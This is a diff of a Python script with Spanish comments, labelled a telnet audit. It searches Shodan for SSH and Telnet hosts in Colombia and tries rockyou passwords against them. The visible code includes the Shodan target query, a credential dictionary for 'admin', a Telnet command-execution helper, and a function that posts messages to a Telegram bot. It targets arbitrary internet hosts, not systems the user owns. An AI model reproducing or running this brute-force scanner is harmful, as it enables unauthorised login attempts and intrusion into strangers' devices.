@@ -25,7 +25,7 @@ logging.basicConfig(filename="telnet_auditoria.log", level=logging.INFO, format=
 NUM_IPS_A_ESCANEAR = 2  # Ajusta este número según lo que necesites
 
 
-# Configuración de API y credenciales
+# Configuración de API y credenciales de Shodan y Telegram
 API_KEY = "XXXXXXXXXXXXXX"
 TELEGRAM_BOT_TOKEN = "XXXXXXXXXXXXXX"
 TELEGRAM_CHAT_ID = "XXXXXXXXXXXXXX"
@@ -53,7 +53,7 @@ def search_shodan(query):
 
 
 
-# Función para enviar mensaje por Telegram
+# Función para enviar mensaje por Telegram 
 def send_telegram_message(message):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
@@ -144,6 +144,8 @@ def check_ssh(ip, username, password):
 
 #    except Exception as e:
 #        logging.error(f"Error en Telnet ({ip}): {e}")
+
+# SI LA FNC "check_telnet" falla, cambiela por la que está comentada en la sección de arriba
 
 def ejecutar_comando(tn, comando):
     """ Envía un comando a Telnet y retorna la respuesta """
@@ -257,8 +259,6 @@ def load_passwords(file_path):
 # Buscar IPs con puerto 22 y 23 abierto en Colombia
 
 
-#ssh_ips = [ip for ip in search_shodan("port:22 country:CO") if is_ssh_open(ip)]
-#telnet_ips = [ip for ip in search_shodan("port:23 country:CO") if is_telnet_open(ip)]
 
 # Buscar IPs con puerto 22 y 23 abierto en Colombia
 ssh_ips = search_shodan("port:22 country:CO")[:NUM_IPS_A_ESCANEAR]
@@ -291,7 +291,7 @@ passwords = load_passwords(rockyou_path)[:10]  # Solo las primeras 20 contraseñ
 #    "root": passwords,
 #    "user": passwords
 #}
-
+# EL CREDENTIALS DE ARRIBA PRUEBA CON 3 USUARIOS EN LUGAR DE 1
 credentials = {
     "admin": passwords
 }
